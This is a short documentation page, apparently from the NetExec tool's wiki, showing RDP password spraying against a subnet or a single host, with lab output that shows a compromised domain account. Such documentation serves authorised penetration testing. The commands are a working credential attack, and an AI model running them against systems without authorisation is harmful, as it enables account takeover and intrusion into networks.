---
description: RDP password spraying using NetExec
---

# Password spraying

#### Password spraying

```
#~ poetry run NetExec rdp 192.168.1.0/24 -u user -p password
```

```
$ poetry run NetExec rdp 192.168.133.157 -u ron -p October2021
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:October2021 
                                                                                                                                                                
$ poetry run NetExec rdp 192.168.133.157 -u rubeus -p October2021
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!)
```

#### Password spraying (without bruteforce)

```
#~ poetry run NetExec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

Expected Results:

```
└─$ poetry run NetExec rdp 192.168.133.157 -u /tmp/users -p passwordfile --no-bruteforce
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:toto 
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\demo:tata
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!
```

{% hint style="info" %}
By default nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.
{% endhint %}
